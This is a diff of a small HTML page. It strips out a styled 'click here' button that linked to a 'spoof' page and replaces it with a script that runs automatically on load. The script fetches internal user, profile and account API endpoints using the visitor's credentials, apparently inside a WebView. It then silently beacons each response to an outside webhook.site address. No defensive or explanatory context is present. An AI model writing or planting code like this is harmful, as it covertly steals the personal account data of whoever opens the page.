@@ -1,27 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <style>
-    body {
-      display: flex;
-      justify-content: center;   /* Tengah horizontal */
-      align-items: center;       /* Tengah vertikal */
-      height: 100vh;             /* Tinggi full layar */
-      margin: 0;
-    }
-
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-  </style>
-</head>
 <body>
+<script>
+(async () => {
+  try {
+    // coba akses endpoint internal (same-origin di WebView)
+    const endpoints = [
+      "/api/user",
+      "/api/profile",
+      "/api/account"
+    ];
 
-<a href="https://ecdnts-del.github.io/spoof/open.html" target="_blank">
-  <button>🔗 click here</button>
-</a>
+    for (let url of endpoints) {
+      try {
+        let res = await fetch(url, {
+          credentials: "include",
+          cache: "no-store"
+        });
 
+        if (!res.ok) continue;
+
+        let data = await res.text();
+
+        // kirim ke webhook
+        navigator.sendBeacon(
+          "https://webhook.site/f00a5dc8-4452-4a1b-b1c5-ea55838c0b19",
+          new Blob([url + ":\n" + data], {type:"text/plain"})
+        );
+
+      } catch(e) {}
+    }
+
+  } catch (e) {}
+})();
+</script>
 </body>
 </html>
